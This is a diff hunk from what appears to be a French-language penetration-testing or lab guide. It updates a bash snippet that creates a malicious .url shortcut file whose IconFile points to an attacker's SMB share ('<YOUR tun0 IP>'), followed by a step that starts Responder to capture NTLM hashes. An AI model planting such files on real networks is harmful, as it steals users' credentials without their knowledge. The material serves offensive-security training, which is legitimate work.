@@ -69,9 +69,11 @@ run
 ```bash
 # Créer un fichier URL malveillant
 cat > shell.url << EOF
-[InternetShortcut]
-URL=http://example.com
-IconFile=\\\\[VOTRE_IP]\\share\\icon.ico
+[InternetShortcut]  
+URL=Random_nonsense  
+WorkingDirectory=Flibertygibbit  
+IconFile=\\<YOUR tun0 IP>\%USERNAME%.icon  
+IconIndex=1
 EOF
 
 # Démarrer Responder
